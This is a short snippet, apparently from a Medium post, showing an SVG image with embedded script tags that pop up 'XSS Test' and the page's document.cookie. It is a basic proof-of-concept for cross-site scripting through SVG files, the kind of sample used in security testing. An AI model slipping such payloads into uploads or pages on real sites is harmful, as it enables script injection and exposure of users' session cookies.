////medium


<svg width=”100%” height=”100%” viewBox=”0 0 100 100"

xmlns=”http://www.w3.org/2000/svg" xmlns:xlink=”http://www.w3.org/1999/xlink">

<circle cx=”50" cy=”50" r=”45" fill=”green” id=”foo” o=”foo”/>

<script>alert(“XSS Test”);</script>

<script>alert(document.cookie);</script>

</svg>